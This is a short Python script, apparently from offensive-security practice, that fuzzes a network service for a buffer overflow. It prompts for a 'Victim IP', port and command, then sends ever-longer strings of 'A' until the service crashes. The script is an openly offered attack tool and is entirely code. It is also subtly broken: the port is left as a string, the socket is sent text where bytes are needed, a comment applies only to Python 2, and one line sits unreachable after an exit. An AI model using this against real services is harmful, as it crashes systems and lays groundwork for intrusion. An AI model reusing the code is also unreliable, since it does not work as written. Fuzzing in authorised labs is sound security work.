
#!/usr/bin/env python3
#BOF Fuzzer Modified
import socket, time, sys
#Be certain when inputting you use " " double quotes around the ip as a string and not an messed up float.
ip = input("Victim IP:")
port = input("Port:")
prefix = input("Enter Command:")
timeout = 5
#appends 100 bytes to the end of the command each loop
buffer = []
bytes = 100
while len(buffer) < 30:
    buffer.append("A" * bytes)
    bytes += 100

for x in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        print("Wiring bytes together.... %s" % len(x))
        s.send(prefix + x + "\r\n")
        s.recv(1024)
        s.send("EXIT\r\n")
        s.recv(1024)
        s.close()

    except:
        print("Crashed at {} ".format(len(x)))
        sys.exit(0)
        x += 100 * "A"
    time.sleep(1)
